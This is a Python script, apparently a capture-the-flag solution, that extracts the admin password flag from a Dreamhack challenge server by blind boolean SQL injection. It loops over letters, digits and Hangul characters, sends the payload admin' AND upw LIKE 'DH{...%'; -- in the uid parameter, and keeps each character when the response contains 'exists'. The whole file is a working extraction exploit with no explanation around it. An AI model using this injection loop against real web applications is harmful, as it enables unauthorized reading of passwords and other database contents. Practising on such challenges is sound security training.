import requests
import string

charset = string.ascii_lowercase + string.ascii_uppercase + string.digits
hangul_start = 0xAC00 
hangul_end = 0xD7A3    
hangul_chars = "".join(chr(i) for i in range(hangul_start, hangul_end + 1))
charset += hangul_chars

target_url = "http://host8.dreamhack.games:10960/?uid=admin%27+AND+upw+LIKE+%27DH%7B"
recevied_flag_content = ""

for i in range(0, 32):
    for char in charset:
        res = requests.get(f"{target_url}{recevied_flag_content}{char}%25%27%3B+--")
        print(f"Test {recevied_flag_content}{char}")

        print(f"{target_url}{recevied_flag_content}{char}%25%27%3B+--")

        if "exists" in res.text:
            recevied_flag_content += char
            print()
            print(f"Got {recevied_flag_content}")
            break
        elif char == charset[-1]:
            print('There is something wrong')

print()
print(f"Final flag content {recevied_flag_content}")